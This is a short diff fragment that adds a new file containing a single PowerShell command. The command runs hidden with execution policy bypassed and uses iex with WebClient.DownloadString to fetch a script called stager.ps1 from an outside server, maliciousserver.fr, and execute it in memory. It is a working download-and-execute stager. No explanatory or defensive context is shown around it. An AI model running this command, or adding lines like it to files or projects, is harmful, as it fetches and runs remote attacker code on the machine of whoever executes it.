@@ -1,0 +1,2 @@
+powershell.exe -exec bypass -w hidden -nop -c "iex(New-Object System.Net.WebClient).DownloadString('https://maliciousserver.fr/stager.ps1')"
+
